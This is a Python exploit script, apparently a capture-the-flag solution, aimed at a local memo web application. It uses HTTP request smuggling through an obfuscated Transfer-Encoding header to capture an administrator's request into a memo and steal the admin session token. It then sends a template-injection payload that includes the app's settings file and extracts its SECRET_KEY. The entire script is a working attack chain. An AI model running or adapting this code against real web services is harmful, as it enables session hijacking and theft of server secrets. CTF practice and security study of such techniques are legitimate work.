import requests
import random
from pwn import *

host = '127.0.0.1'
port = 8080

def convert(content):
    return (
        content
        .replace("\n", "\r\n")
        .encode("utf-8")
    )

def trigger_desync(token, i):
    content = """GET /memo/memos HTTP/1.1
Host: {host}
User-Agent: attacker
Content-Length: {length}
Transfer-Encoding: \x0bchunked
Connection: keep-alive
Cookie: token={token}

0

"""
    data = 'title=hack&content=admin_http_follow_by'
    payload = '''POST /memo/memos HTTP/1.1
Host: {host}
User-Agent: add on admin request
Content-Length: {length}
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Cookie: token={token}

{data}'''

    r = remote(host, port)
    payload = convert(payload.format(host=host, data=data, length=str(len(data)+i), token=token))
    content = convert(content.format(host=host, length=str(5+len(payload)), token=token))
    final = content+payload
    r.send(final)
    while True:
        try:
            response = r.recv()
            if b'HTTP/1.1 200 OK' in response:
                print('waiting for admin visit...')
        except EOFError:
            break

if __name__=="__main__":
    url = 'http://'+host+':'+str(port)
    name = str(round(random.random()*100000))

    reg_form = {"username":name, "password":"hanch", "register":"Register"}
    res = requests.post(url+'/memo/login', data=reg_form, headers={'User-Agent':'loginer'})
    token = res.history[0].cookies['token']
    cookies = {'token':token}

    i = 240
    while True:
        res = requests.post(url+'/memo/report', data={'url':url}, headers={'User-Agent':'reporter'}, cookies=cookies)
        trigger_desync(token, i)
        sleep(1)
        res = requests.get(url+'/memo/memos', cookies=cookies)
        cards = res.text.split('<div class="card">')
        last_card = cards[1]
        view_path = last_card.split('<a href="')[1].split('">')[0]
        print(len(cards))
        res = requests.get(url+view_path, cookies=cookies)
        if 'admin_http_follow_by' not in res.text:
            continue
        admin_http = res.text.split('admin_http_follow_by')[1].split('</span>')[0]
        print(admin_http)
        if 'token=' in admin_http:
            steal = admin_http.split('token=')[1]
            if '\r\n' in steal:
                admin_token = steal.split('\r\n')[0]
                break
            if len(steal)>130:
                i += 1
                continue
            else:
                i += 10
                continue
        i += 20     
     
    print('admin token : '+admin_token)

    cookies = {'token':admin_token}
    injection = {'name__regex':'admin|{% include "cykor_memo/settings.py" %}'}
    res = requests.post(url+'/admin/users', data=injection, headers={'User-Agent':'attacker'}, cookies=cookies)
    flag = res.text.split("SECRET_KEY = '")[1].split("'")[0]

    print(flag)